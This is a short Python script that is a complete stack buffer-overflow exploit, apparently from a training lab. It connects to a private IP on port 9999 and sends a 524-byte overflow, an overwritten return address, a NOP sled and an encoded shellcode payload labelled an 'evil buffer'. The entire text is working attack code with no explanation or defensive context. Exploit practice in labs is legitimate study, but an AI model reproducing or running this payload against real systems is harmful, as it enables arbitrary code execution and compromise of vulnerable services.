import socket

ip = "10.10.67.121"
port = 9999

prefix = ""
offset = 524
overflow = "A" * offset
retn = "\xf3\x12\x17\x31"
padding = "\x90" * 16
buf =  ""
buf += "\xbf\x23\xd4\xaa\xdf\xdb\xdf\xd9\x74\x24\xf4\x58"
buf += "\x33\xc9\xb1\x1f\x83\xe8\xfc\x31\x78\x11\x03\x78"
buf += "\x11\xe2\xd6\xbe\xa0\x81\x29\xe4\x42\xde\x1a\x59"
buf += "\xfe\x4b\x9e\xed\x66\x05\x7f\xc0\xe7\x82\x24\xb3"
buf += "\xed\xbe\x81\x54\x9a\xbc\x35\x4a\x06\x48\xd4\x06"
buf += "\xd0\x12\x46\x86\x4b\x2a\x87\x6b\xb9\xac\xc2\xac"
buf += "\x38\xb4\x82\x58\x86\xae\xb8\xa1\xf8\x2e\xe4\xcb"
buf += "\xf8\x44\x11\x85\x1a\xa9\xd0\x58\x5c\x4f\x22\x1b"
buf += "\xe0\xbb\x85\x6e\x1d\x85\xc9\x9e\x22\xf5\x40\x7d"
buf += "\xe3\x1e\x5e\x43\x07\xec\xee\x3e\x05\x6d\x8b\x01"
buf += "\xed\x7e\xc8\x08\xef\xe6\x5c\x60\x40\x1b\x6d\xf5"
buf += "\x25\xdc\x15\xf4\xda\x3c\x5d\xf9\x24\xbf\x9d\x41"
buf += "\x25\xbf\x9d\xb5\xeb\x3f"
payload = buf
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix
byte_message = bytes(buffer, "latin-1")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(byte_message + b"\r\n")
    print("Done!")
except:
    print("Could not connect.")
